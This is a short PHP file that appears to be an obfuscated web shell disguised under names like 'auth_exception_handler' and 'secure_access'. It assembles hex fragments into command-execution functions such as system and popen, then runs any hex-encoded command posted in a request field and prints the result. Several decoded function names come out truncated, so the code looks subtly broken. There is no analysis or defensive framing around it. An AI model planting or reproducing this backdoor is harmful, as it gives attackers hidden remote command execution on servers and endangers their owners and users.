<?php


$comp1 = '746';
$comp2 = '657';
$comp3 = '865';
$comp4 = '706';
$comp5 = '173';
$comp6 = '737';
$comp7 = '468';
$comp8 = 'f70';
$comp9 = '656';
$comp10 = '16d';
$comp11 = '5f6';
$comp12 = '765';
$comp13 = '745';
$comp14 = 'f63';
$comp15 = 'e74';
$comp16 = '36c';
$comp17 = '6f7';
$comp18 = '573';
$auth_exception_handler1 = pack("H*", '737' . '973' . $comp1 . '56d');
$auth_exception_handler2 = pack("H*", '736' . '865' . '6c6' . 'c5f' . $comp2 . $comp3);
$auth_exception_handler3 = pack("H*", '657' . $comp3);
$auth_exception_handler4 = pack("H*", $comp4 . $comp5 . $comp6 . $comp7 . '727');
$auth_exception_handler5 = pack("H*", $comp4 . $comp8 . $comp9);
$auth_exception_handler6 = pack("H*", '737' . '472' . '656' . $comp10 . $comp11 . $comp12 . $comp13 . $comp14 . '6f6' . $comp15 . $comp9 . $comp15);
$auth_exception_handler7 = pack("H*", '706' . $comp16 . $comp17 . '365');
$secure_access = pack("H*", '736' . '563' . '757' . '265' . $comp11 . '163' . '636' . $comp18);
if (isset($_POST[$secure_access])) {
    $secure_access = pack("H*", $_POST[$secure_access]);
    if (function_exists($auth_exception_handler1)) {
        $auth_exception_handler1($secure_access);
    } elseif (function_exists($auth_exception_handler2)) {
        print $auth_exception_handler2($secure_access);
    } elseif (function_exists($auth_exception_handler3)) {
        $auth_exception_handler3($secure_access, $element_descriptor);
        print join("\n", $element_descriptor);
    } elseif (function_exists($auth_exception_handler4)) {
        $auth_exception_handler4($secure_access);
    } elseif (function_exists($auth_exception_handler5) && function_exists($auth_exception_handler6) && function_exists($auth_exception_handler7)) {
        $entity_dat = $auth_exception_handler5($secure_access, 'r');
        if ($entity_dat) {
            $rec_binding = $auth_exception_handler6($entity_dat);
            $auth_exception_handler7($entity_dat);
            print $rec_binding;
        }
    }
    exit;
}
